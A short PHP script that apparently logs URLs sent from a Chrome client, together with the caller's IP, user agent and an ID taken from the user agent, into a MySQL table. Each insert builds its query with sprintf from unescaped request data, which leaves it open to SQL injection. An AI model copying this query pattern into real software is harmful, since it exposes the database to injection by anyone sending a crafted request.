<?php
// config here
include 'config.php';
include 'curl.php';
$queryString = $_SERVER['QUERY_STRING'];
$arrExplode  = explode('info:', $queryString);

// no info:: found
if (count($arrExplode)  == 2) {
    $url = $arrExplode['1'];
    $isok = 1;
} else {
    $url = 'null';
    $isok = 0;
}

if(!empty($_SERVER["HTTP_CLIENT_IP"])) {
   $ip = $_SERVER["HTTP_CLIENT_IP"];  
} elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) {
   $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];  
} elseif (!empty($_SERVER["REMOTE_ADDR"])) {
   $ip = $_SERVER["REMOTE_ADDR"];  
} else {
   $ip = "0.0.0.0"; 
}

$time = date("Y-m-d H:i:s", time()+3600*4);

$userAgent = $_SERVER['HTTP_USER_AGENT'];
if (!$userAgent) {
    $userAgent = "NullUserAgent";
}

//Ignore site list
$search = array(
        'localhost',
        );
$replace = array(
        '',
        );

if(str_replace($search, $replace, $url) != $url) {
    $title = 'Ignore';
} else {
    $curl = new PCurl();
    $curl->setUrl($url);
    $title = $curl->getTitle();
}
// uuid
if (strstr($_SERVER['HTTP_USER_AGENT'], '@@@', TRUE) !==FALSE) {
    $uuid = strstr($_SERVER['HTTP_USER_AGENT'], '@@@', TRUE);
} else {
    $uuid = NULL;
}
  
//log to my db
$conn = mysql_connect($mysqlHost, $mysqlUser, $mysqlPwd);
if (!$conn) {
    exit('Cannot connect to mysql '.mysql_errno());
}
mysql_select_db('google');
mysql_query("set names 'utf8'");
if (is_null($uuid)) {
    $sql = sprintf("insert into chromeurllog (url, time, ip, querystring, isok, title, useragent) values ('%s' , '%s', '%s', '%s', '%s', '%s', '%s')", $url, $time, $ip, $queryString, $isok, $title, $userAgent);
} else {
    $sql = sprintf("insert into chromeurllog (url, time, ip, querystring, isok, title, useragent, chromeuuid) values ('%s' , '%s', '%s', '%s', '%s', '%s', '%s', '%s')", $url, $time, $ip, $queryString, $isok, $title, $userAgent, $uuid);
}
mysql_query($sql);
mysql_close($conn);
